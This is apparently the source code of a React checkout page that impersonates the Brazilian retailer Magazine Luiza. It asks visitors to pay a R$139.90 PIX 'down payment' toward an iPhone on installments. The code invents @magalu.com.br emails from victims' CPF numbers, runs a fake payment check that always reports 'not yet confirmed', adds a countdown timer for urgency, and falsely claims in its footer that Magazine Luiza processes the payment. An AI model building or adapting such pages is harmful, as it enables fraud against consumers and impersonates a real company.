import { useState, useEffect, useRef } from "react";
import { ArrowLeft, Shield, Clock, Copy, Check, Loader2, AlertTriangle } from "lucide-react";
import { useLocation, useSearch } from "wouter";
import { CartItem } from "@/types";
import { trpc } from "@/lib/trpc";

/**
 * Página de Pagamento PIX - Integração com Duttyfy e UTMify
 * - Exibe modelo do aparelho e valores (mensal + total)
 * - Entrada de R$139,90
 * - QR Code PIX via API Duttyfy
 * - Envio de UTMs para UTMify
 */

interface CPFData {
  nome?: string;
  cpf?: string;
  [key: string]: unknown;
}

interface PaymentResponse {
  success: boolean;
  pixCode?: string;
  qrCodeBase64?: string;
  transactionId?: string;
  error?: string;
}

export default function Payment() {
  const [, navigate] = useLocation();
  const searchString = useSearch();
  const [cpfData, setCpfData] = useState<CPFData | null>(null);
  const [cartItem, setCartItem] = useState<CartItem | null>(null);
  const [loading, setLoading] = useState(true);
  const [pixCode, setPixCode] = useState("");
  const [qrCodeBase64, setQrCodeBase64] = useState("");
  const [transactionId, setTransactionId] = useState("");
  const [copied, setCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutos
  const [paymentStatus, setPaymentStatus] = useState<"pending" | "checking" | "paid" | "error">("pending");
  const [errorMessage, setErrorMessage] = useState("");
  const verificacaoInterval = useRef<NodeJS.Timeout | null>(null);
  const qrCodeRef = useRef<HTMLDivElement>(null);

  // Extrair parâmetros UTM da URL
  const urlParams = new URLSearchParams(searchString);
  const parcela = urlParams.get("parcela") || "40";

  // Valor da entrada
  const ENTRADA_VALOR = 139.90;

  // Capturar todas as UTMs
  const capturarUTMs = () => {
    const utms: Record<string, string> = {};
    const params = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'utm_id', 'fbclid', 'gclid', 'src', 'xcod', 'sck', 'cpf', 'iphone', 'parcela'];
    
    params.forEach((param) => {
      const value = urlParams.get(param);
      if (value) {
        utms[param] = decodeURIComponent(value);
      }
    });
    
    // Também tenta pegar do localStorage
    params.forEach((param) => {
      if (!utms[param]) {
        const stored = localStorage.getItem('utm_' + param) || localStorage.getItem(param);
        if (stored) utms[param] = stored;
      }
    });
    
    console.log('[UTM] UTMs capturadas:', utms);
    return utms;
  };

  // Timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 0) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Carregar dados do localStorage
  useEffect(() => {
    const savedCpfData = localStorage.getItem("cpfData");
    const savedCartItem = localStorage.getItem("cartItem");

    if (savedCpfData) {
      setCpfData(JSON.parse(savedCpfData));
    }
    if (savedCartItem) {
      setCartItem(JSON.parse(savedCartItem));
    }
  }, []);

  // Mutation para gerar PIX
  const generatePixMutation = trpc.payment.generatePix.useMutation({
    onSuccess: (data) => {
      console.log('[Pagamento] PIX gerado com sucesso:', data);
      setPixCode(data.pixCode);
      setTransactionId(data.transactionId);
      
      // Gerar QR Code
      generateQRCode(data.pixCode);
      
      // Iniciar verificação automática
      verificacaoInterval.current = setInterval(verificarPagamento, 5000);
      
      setLoading(false);
    },
    onError: (error) => {
      console.error('[Pagamento] Erro:', error);
      setErrorMessage(error.message || 'Erro ao gerar PIX');
      setPaymentStatus("error");
      setLoading(false);
    },
  });

  // Iniciar pagamento
  useEffect(() => {
    const iniciarPagamento = async () => {
      try {
        console.log('[Pagamento] Iniciando...');
        
        const utms = capturarUTMs();
        const savedCpfData = localStorage.getItem("cpfData");
        const cpfInfo = savedCpfData ? JSON.parse(savedCpfData) : {};
        const savedCartItem = localStorage.getItem("cartItem");
        const cartInfo = savedCartItem ? JSON.parse(savedCartItem) : {};
        
        const cpf = cpfInfo.cpf || urlParams.get("cpf") || "";
        const nome = cpfInfo.nome || "Cliente";
        const email = `${cpf.replace(/\D/g, "")}@magalu.com.br`;
        const productName = cartInfo.displayName || urlParams.get("iphone") || "iPhone";

        console.log('[Pagamento] Dados:', { cpf, nome, email, productName });

        // Chamar API via tRPC
        generatePixMutation.mutate({
          amount: Math.round(ENTRADA_VALOR * 100), // Em centavos
          cpf,
          customerName: nome,
          customerEmail: email,
          productName: `Entrada ${productName} - Parcelamento ${parcela}x`,
          utms: {
            utm_source: utms.utm_source,
            utm_medium: utms.utm_medium,
            utm_campaign: utms.utm_campaign,
            utm_content: utms.utm_content,
            utm_term: utms.utm_term,
            xcod: utms.xcod,
            sck: utms.sck,
            fbclid: utms.fbclid,
            gclid: utms.gclid,
            src: utms.src,
          },
        });
      } catch (error) {
        console.error('[Pagamento] Erro:', error);
        setErrorMessage(error instanceof Error ? error.message : 'Erro ao gerar PIX');
        setPaymentStatus("error");
        setLoading(false);
      }
    };

    iniciarPagamento();

    return () => {
      if (verificacaoInterval.current) {
        clearInterval(verificacaoInterval.current);
      }
    };
  }, []);

  // Gerar QR Code quando pixCode mudar
  useEffect(() => {
    if (pixCode && qrCodeRef.current) {
      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
      qrCodeRef.current.innerHTML = `<img src="${qrUrl}" alt="QR Code PIX" class="mx-auto rounded-lg" style="max-width: 200px;" />`;
    }
  }, [pixCode]);

  // Função auxiliar para gerar QR Code (mantida para compatibilidade)
  const generateQRCode = (code: string) => {
    // QR Code será gerado pelo useEffect acima
    console.log('[QR] Código PIX recebido:', code.substring(0, 50) + '...');
  };

  // Verificar pagamento
  const verificarPagamento = async () => {
    if (!transactionId) return;
    
    try {
      // Em produção, verificar via backend
      // Por enquanto, apenas log
      console.log('[Verificar] Checking transaction:', transactionId);
    } catch (error) {
      console.log('[Verificar] Erro:', error);
    }
  };

  // Verificação manual
  const verificarPagamentoManual = async () => {
    setPaymentStatus("checking");
    
    try {
      // Simular verificação
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Em produção, verificar via backend
      setErrorMessage("Pagamento ainda não confirmado. Aguarde alguns instantes após pagar e tente novamente.");
      setPaymentStatus("pending");
    } catch (error) {
      setErrorMessage("Erro ao verificar. Tente novamente.");
      setPaymentStatus("pending");
    }
  };

  // Copiar PIX
  const copiarPix = async () => {
    if (pixCode) {
      await navigator.clipboard.writeText(pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  // Formatar tempo
  const formatTime = (seconds: number) => {
    const min = Math.floor(seconds / 60);
    const seg = seconds % 60;
    return `${min.toString().padStart(2, '0')}:${seg.toString().padStart(2, '0')}`;
  };

  // Calcular valores
  const valorTotal = cartItem?.price || 6799;
  const valorParcela = ((valorTotal - ENTRADA_VALOR) / parseInt(parcela)).toFixed(2);

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="w-16 h-16 text-[#0086FF] animate-spin mx-auto mb-4" />
          <h2 className="text-xl font-bold text-[#0086FF]">Gerando PIX...</h2>
          <p className="text-gray-600">Aguarde um momento</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header className="magalu-header sticky top-0 z-50">
        <div className="flex items-center px-3 py-3">
          <button
            onClick={() => navigate("/resultado")}
            className="p-1 text-white"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="ml-3">
            <h1 className="text-lg font-bold text-white">Pagamento PIX</h1>
            <p className="text-xs text-white/80">Magazine Luiza</p>
          </div>
        </div>
      </header>

      <div className="max-w-lg mx-auto p-4">
        {/* Card Principal */}
        <div className="bg-white rounded-xl shadow-lg p-5 mb-4">


          {/* Mensagens de Erro/Sucesso */}
          {errorMessage && (
            <div className="bg-red-50 border-l-4 border-red-500 p-3 rounded mb-4">
              <p className="text-sm text-red-700">{errorMessage}</p>
            </div>
          )}

          {paymentStatus === "paid" && (
            <div className="bg-green-50 border-l-4 border-green-500 p-3 rounded mb-4">
              <p className="text-sm text-green-700">Pagamento confirmado com sucesso!</p>
            </div>
          )}

          {/* Produto Selecionado */}
          {cartItem && (
            <div className="bg-gray-50 rounded-lg p-4 mb-4">
              <p className="text-xs text-gray-500 mb-1">Produto selecionado:</p>
              <p className="font-bold text-gray-800">{cartItem.productName}</p>
              <p className="text-xs text-gray-500">Cor: {cartItem.color}</p>
              <div className="mt-2 pt-2 border-t border-gray-200">
                <div className="flex justify-between text-sm">
                  <span className="text-gray-600">Valor total:</span>
                  <span className="font-bold text-gray-800">R$ {valorTotal.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between text-sm mt-1">
                  <span className="text-gray-600">Parcelamento:</span>
                  <span className="font-semibold text-[#00A650]">{parcela}x de R$ {valorParcela}</span>
                </div>
              </div>
            </div>
          )}

          {/* Valor da Entrada */}
          <div className="bg-[#f0f7ff] border-l-4 border-[#0086FF] p-4 rounded-lg mb-4">
            <p className="text-xs text-gray-600 mb-1">Valor da entrada (pagar agora):</p>
            <p className="text-3xl font-bold text-[#00A650]">R$ {ENTRADA_VALOR.toFixed(2).replace('.', ',')}</p>
            <div className="flex items-center gap-2 mt-2 text-sm text-gray-600">
              <Clock className="w-4 h-4" />
              <span>Expira em: <strong className="text-[#0086FF]">{formatTime(timeLeft)}</strong></span>
            </div>
          </div>



          {/* QR Code */}
          <div className="border-2 border-dashed border-[#0086FF] rounded-xl p-5 text-center mb-4 bg-gray-50">
            <div 
              ref={qrCodeRef} 
              className="min-h-[200px] flex items-center justify-center mb-2"
            >
              {!pixCode && <Loader2 className="w-8 h-8 text-[#0086FF] animate-spin" />}
            </div>
            <p className="text-xs text-gray-500">Escaneie o QR Code ou copie o código PIX</p>
          </div>

          {/* Código PIX */}
          <div className="mb-4">
            <p className="text-xs text-gray-500 mb-2">Código PIX para cópia:</p>
            <input
              type="text"
              readOnly
              value={pixCode || "Gerando código PIX..."}
              className="w-full p-3 border-2 border-gray-200 rounded-lg text-xs font-mono bg-gray-50"
            />
          </div>

          {/* Botão Copiar */}
          <button
            onClick={copiarPix}
            disabled={!pixCode}
            className={`w-full py-4 rounded-lg font-bold text-white flex items-center justify-center gap-2 mb-4 transition-all ${
              copied 
                ? "bg-green-500" 
                : "magalu-header hover:opacity-90"
            }`}
          >
            {copied ? (
              <>
                <Check className="w-5 h-5" />
                COPIADO!
              </>
            ) : (
              <>
                <Copy className="w-5 h-5" />
                COPIAR CÓDIGO PIX
              </>
            )}
          </button>

          {/* Aviso */}
          <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 rounded-lg mb-4">
            <div className="flex items-start gap-2">
              <AlertTriangle className="w-5 h-5 text-yellow-600 flex-shrink-0 mt-0.5" />
              <div>
                <p className="font-semibold text-yellow-800 text-sm">IMPORTANTE:</p>
                <p className="text-xs text-yellow-700 mt-1">
                  Após o pagamento da entrada, você receberá a confirmação do seu parcelamento e as instruções para recebimento do aparelho.
                </p>
              </div>
            </div>
          </div>

          {/* Status de Verificação */}
          <div className="text-center text-sm text-gray-500 mb-3">
            <Loader2 className="w-4 h-4 inline-block animate-spin mr-2" />
            Verificando pagamento automaticamente...
          </div>

          {/* Botão Verificar */}
          <button
            onClick={verificarPagamentoManual}
            disabled={paymentStatus === "checking"}
            className="w-full py-3 rounded-lg font-semibold text-white bg-[#00A650] hover:bg-[#008f44] transition-all disabled:bg-gray-400"
          >
            {paymentStatus === "checking" ? "Verificando..." : "✓ JÁ FIZ O PAGAMENTO"}
          </button>
        </div>

        {/* Footer */}
        <div className="bg-white rounded-lg p-4 flex items-center justify-center gap-2">
          <Shield className="w-4 h-4 text-[#00A650]" />
          <p className="text-xs text-gray-600">Pagamento processado com segurança pela Magazine Luiza</p>
        </div>
      </div>
    </div>
  );
}
